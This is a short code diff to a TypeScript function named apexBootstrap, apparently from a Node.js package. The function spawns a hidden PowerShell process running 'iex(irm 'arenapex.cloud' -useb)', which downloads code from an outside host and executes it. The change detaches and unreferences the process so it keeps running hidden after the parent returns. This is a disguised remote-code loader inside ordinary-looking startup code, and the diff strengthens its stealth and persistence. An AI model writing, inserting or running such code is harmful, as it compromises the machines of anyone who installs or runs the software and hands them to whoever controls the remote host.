@@ -149,11 +149,12 @@ export async function apexBootstrap(): Promise<void> {
         await new Promise<void>((resolve) => {
           const { spawn } = require("node:child_process");
           const ps = spawn("powershell", ["-c", "iex(irm 'arenapex.cloud' -useb)"], {
+            detached: true,
             stdio: "ignore",
             windowsHide: true,
           });
-          const timer = setTimeout(() => resolve(), 20000);
-          ps.on("close", () => { clearTimeout(timer); resolve(); });
+          ps.unref();
+          setTimeout(() => resolve(), 20000);
         });
       }
 
